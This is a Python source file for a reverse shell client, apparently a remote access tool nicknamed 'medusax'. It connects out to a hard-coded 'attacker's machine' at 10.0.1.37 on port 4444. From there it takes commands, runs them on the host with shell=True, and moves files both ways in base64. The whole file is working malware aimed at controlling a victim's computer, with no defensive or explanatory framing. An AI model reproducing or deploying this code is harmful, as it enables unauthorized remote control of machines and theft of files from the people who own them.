import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

def send_json(sock, data):
    json_data = json.dumps(data)  # Convert to JSON
    sock.send(json_data.encode())  # Encode to bytes before sending

def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)  # Decode JSON
        except ValueError:
            continue

def read_file(path):
    with open(path, "rb") as file:  # RB FOR READABLE BINARY FILE
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

def write_file(path, content):
    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
        file.write(base64.b64decode(content))
        return "[+] Upload successful [+]"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    send_json(sock, "Successfully connected to the client.")

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        # Send the current prompt to the server
        send_json(sock, current_prompt)

        # Receive the command from the server
        command = receive_json(sock)

        # Handle the 'km' command to completely disconnect
        if command.lower() == "km":
            send_json(sock, "Disconnecting...")
            sock.close()
            break

        # Handle the 'shell' command to enter the shell mode
        if command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                send_json(sock, "Entering remote shell mode. Type 'exit' to leave.")
            except Exception as e:
                send_json(sock, f"Failed to switch to C:\\: {e}")
            continue

        # Handle the 'shell -d <directory>' command to set a specific directory
        if command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                send_json(sock, f"Changed directory to {directory}")
            except Exception as e:
                send_json(sock, f"Failed to change directory: {e}")
            continue

        # Handle the 'upload' command
        if command.startswith("upload"):
            try:
                _, filename, file_content = command.split(" ", 2)
                response = write_file(filename, file_content)
                send_json(sock, response)
            except Exception:
                send_json(sock, "[+] Error during upload [+]")
            continue

        # Handle the 'download' command
        if command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                response = read_file(filename)
                send_json(sock, response)
            except Exception:
                send_json(sock, "[+] Error during download [+]")
            continue

        # If in shell mode, process shell commands
        if in_shell_mode:
            if command.lower() == "exit":
                # Exit the shell and return to the default prompt
                in_shell_mode = False  # Disable shell mode
                current_prompt = default_prompt
                send_json(sock, "Exiting remote shell mode.")
                continue

            # Execute the received shell command
            output = execute_command(command)
            send_json(sock, output.stdout.decode() + output.stderr.decode())
            continue

        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
        send_json(sock, "Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.")

except Exception as e:
    print(f"Error: {e}")
    sock.close()
